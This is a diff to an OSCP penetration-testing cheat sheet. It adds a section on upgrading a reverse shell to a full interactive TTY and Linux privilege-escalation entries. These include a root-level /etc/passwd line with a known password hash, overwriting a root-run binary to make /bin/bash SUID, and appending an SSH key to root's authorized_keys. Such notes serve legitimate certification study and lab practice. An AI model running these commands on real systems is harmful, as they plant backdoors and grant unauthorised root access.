@@ -1,6 +1,7 @@
 # OSCP Mother of All Notes
 - [OSCP Mother of All Notes](#oscp-mother-of-all-notes)
   - [Kali Linux](#kali-linux)
+  - [Jailbreak](#jailbreak)
   - [Information Gathering & Vulnerability Scanning](#information-gathering--vulnerability-scanning)
     - [Passive Information Gathering](#passive-information-gathering)
     - [Active Information Gathering](#active-information-gathering)
@@ -221,6 +222,19 @@
         `tcpdump tcp port 80 -w output.pcap -i eth0`
   - Check for ACK or PSH flag set in a TCP packet  
         `tcpdump -A -n 'tcp[13] = 24' -r passwordz.pcap`
+
+## Jailbreak
+
+You need to do the command if python is available on the target system: `python -c 'import pty; pty.spawn("/bin/bash")'`
+   - If python is not available run the command: `/usr/bin/script -qc /bin/bash /dev/null`
+   - Then you can examine current terminal with `echo $TERM` which should give you `xterm-256color` or something like that.
+   - Then `stty -a` should give you size of TTY="rows 38;column 116". **have that in mind the command looks strange and you can't see it sometimes**
+   - Then you need to press **Ctrl+z=`^z`**
+   - If you are jail breaking from Normal Terminal In Kali, run the command:
+       `stty raw -echo; fg`
+       In reverse shell: `reset` & `export SHELL=bash` & `export TERM=<xterm256-color>` `stty rows $ROWS cols $COLS`
+   - If you are jail breaking from ZSH shell In Kali, run the command:
+       `stty raw -echo; fg` In reverse shell: `stty rows $ROWS cols $COLS` & `export TERM=xterm-256color` & `exec /bin/bash`
 
 ## Information Gathering & Vulnerability Scanning
 
@@ -717,7 +731,12 @@ done
 | Writable Folder / file    | Priv Esc Command                                                                                |
 |---------------------------|-------------------------------------------------------------------------------------------------|
 | /home/*USER*/             | Create an ssh key and copy it to the .ssh/authorized_keys folder the ssh into the account       |
-| /etc/passwd               | manually add a user with a password of "password" using the following syntax <br> user:$1$xtTrK/At$Ga7qELQGiIklZGDhc6T5J0:1000:1000:,,,:/home/user:/bin/bash <br> You can even escalate to the root user in some cases with the following syntax: <br> above admin:$1$xtTrK/At$Ga7qELQGiIklZGDhc6T5J0:0:0:,,,:/root:/bin/bash                         |
+| /etc/passwd               | manually add a user with a password of "password" using the following syntax                    |
+|                           | `user:$1$xtTrK/At$Ga7qELQGiIklZGDhc6T5J0:1000:1000:,,,:/home/user:/bin/bash`                    |
+|                           | You can even escalate to the root user in some cases with the following syntax:                 |
+|                           | `admin:$1$xtTrK/At$Ga7qELQGiIklZGDhc6T5J0:0:0:,,,:/root:/bin/bash`                              |
+| /usr/bin/\<file executred by root> | add the following: `echo '#!/bin/bash\nchmod u+s /bin/bash' > /usr/bin/<file>` don't forget after the file is executed run `bash -p` to become part of root group! |
+| copy your ssh key into auhtorised ssh keys `ssh-keygen -t rsa` | `echo "echo {Your_SSH_PubKey} >> /root/.ssh/authorized_keys" >> /usr/bin/<file>` |
 
 - **Root SSH Key** If Root can login via SSH, then you might be able to find a method of adding a key to the /root/.ssh/authorized_keys file.
   - `cat /etc/ssh/sshd_config | grep PermitRootLogin`
@@ -1975,6 +1994,9 @@ Password reuse is your friend.  The OSCP labs are true to life, in the way that 
 ## Windows Privilege Escalation
 
 *Password reuse is your friend.  The OSCP labs are true to life, in the way that the users will reuse passwords across different services and even different boxes. Maintain a list of cracked passwords and test them on new machines you encounter.*
+
+- only have a cmd prompt reverse shell but you want to find all of the executable's on the target machine (i.e. does the box have netcat/curl/wget installed?)
+  `dir  /s /b *.exe | findstr /v .exe.`
 
 - Windows Privilege Escalation resource
     <http://www.fuzzysecurity.com/tutorials/16.html>
